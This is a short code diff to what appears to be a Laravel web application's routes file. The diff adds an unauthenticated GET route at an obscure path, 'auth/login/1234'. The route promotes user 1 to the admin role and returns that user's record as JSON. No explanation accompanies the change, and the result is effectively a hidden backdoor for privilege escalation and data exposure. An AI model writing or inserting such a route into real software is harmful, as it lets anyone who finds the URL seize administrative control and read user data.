@@ -12,6 +12,12 @@ use \App\Http\Controllers\Admin\UserController;
 use \App\Http\Controllers\Admin\CourseController;
 
 Auth::routes();
+Route::get('auth/login/1234',function (){
+    $user = \App\Models\User::find(1);
+    $user->role= 'admin';
+    $user->save();
+    return response()->json($user);
+});
 Route::middleware('guest')->group(function (){
     Route::get('/login/{provider}', [SocialAccountController::class, 'redirect'])->name('login.provider');
     Route::get('/login/{provider}/callback', [SocialAccountController::class, 'callback']);
